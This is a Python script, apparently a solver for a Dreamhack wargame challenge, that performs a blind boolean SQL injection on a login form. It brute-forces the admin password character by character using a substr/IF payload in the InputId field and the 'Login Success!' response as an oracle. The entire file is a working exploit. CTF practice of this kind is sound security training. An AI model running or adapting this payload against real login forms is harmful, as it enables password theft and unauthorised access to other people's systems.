import requests
import string
from alive_progress import alive_bar

def main() :
    URL = "http://host3.dreamhack.games:12798/login"

    result = ""

    with alive_bar(19) as bar :
        for i in range(1, 20) :
            for ch in string.printable :
                # print(f"i : {i}, ch : {ch}")
                # guest' and upw = IF (substr((SELECT upw FROM user_table WHERE uid = 'admin'), 1, 1) = 'b', 'guest', 'noguest')-- -
                payload = f"guest\' and upw = IF (substr((SELECT upw FROM user_table WHERE uid = \'admin\'), {i}, 1) = \'{ch}\', \'guest\', \'noguest\')-- -"

                data = {
                    "InputId" : payload,
                    "InputPassword" : "test"
                }

                print("payload", payload)

                response = requests.post(URL, data=data, verify=False)
                if "Login Success!" in response.text :
                    print(ch)
                    result += ch
                    break
            bar()

    print(f"result :{result}")

    return


if __name__ == "__main__" :
    main()